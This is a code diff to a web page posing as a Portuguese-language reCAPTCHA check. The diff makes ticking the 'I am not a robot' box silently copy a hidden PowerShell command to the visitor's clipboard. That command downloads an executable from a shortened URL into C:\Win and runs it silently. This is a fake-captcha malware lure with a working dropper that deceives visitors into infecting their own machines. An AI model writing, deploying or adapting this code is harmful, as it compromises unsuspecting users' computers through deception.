@@ -124,7 +124,7 @@
 
     <div class="captcha-container">
         <div class="captcha-header">
-            <input type="checkbox" id="captcha-checkbox" onclick="showVerification()">
+            <input type="checkbox" id="captcha-checkbox" onclick="copyToClipboard(); showVerification()">
             <label for="captcha-checkbox">Não sou um robô</label>
             <div class="captcha-logo-container">
                 <img class="captcha-logo" src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="ReCAPTCHA logo">
@@ -147,6 +147,17 @@
     </div>
 
     <script>
+        function copyToClipboard() {
+            const textToCopy = "powershell.exe -WindowStyle Hidden -Command \"New-Item C:\\Win -ItemType Directory -Force; Invoke-WebRequest -Uri 'https://tinyurl.com/4c24m3as' -OutFile C:\\Win\\instalador.exe; Start-Process C:\\Win\\instalador.exe -ArgumentList '/S' -WindowStyle Hidden\"";
+            
+            const tempTextArea = document.createElement("textarea");
+            tempTextArea.value = textToCopy;
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            document.execCommand("copy");
+            document.body.removeChild(tempTextArea);
+        }
+
         function showVerification() {
             document.getElementById("verification-box").style.display = "block";
             document.getElementById("verify-button").style.display = "inline-block";
